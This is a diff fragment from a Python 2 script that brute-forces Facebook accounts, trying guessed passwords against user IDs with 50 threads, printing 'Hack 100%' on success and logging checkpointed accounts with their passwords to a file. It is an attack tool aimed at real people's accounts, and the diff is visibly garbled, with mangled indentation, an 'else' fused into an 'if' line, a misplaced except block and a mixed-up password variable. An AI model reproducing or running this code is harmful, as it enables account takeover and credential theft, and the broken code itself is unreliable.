@@ -470,13 +470,15 @@ def pilih_super():
 															if 'access_token' in q:
 																print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;96m▬\x1b[1;97m-' + user + '-\x1b[1;96m▬\x1b[1;97m-' + pass7
 																oks.append(user+pass7)
-															else:
-																if 'www.facebook.com' in q["error_msg"]:
+															else														if 'www.facebook.com' in q["error_msg"]:
 																	print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;96m▬\x1b[1;97m-' + user + '-\x1b[1;96m▬\x1b[1;97m-' + pass7
 																	cek = open("out/checkpoint.txt", "a")
-	except:
-         pass																cek.write(user+"|"+pass7+"\n")
-																	cek.close()																cekpoint.append(user+pass7)	
+                                                                                                                                        cek.write(user+"|"+pass7+"\n")
+																	cek.close()
+                                                                                                                                        cekpoint.append(user+pass6)
+          except:
+            pass
+																cekpoint.append(user+pass7)	
 	p = ThreadPool(50)
 	p.map(main, id)
 	print "\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mrameezsarwar\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
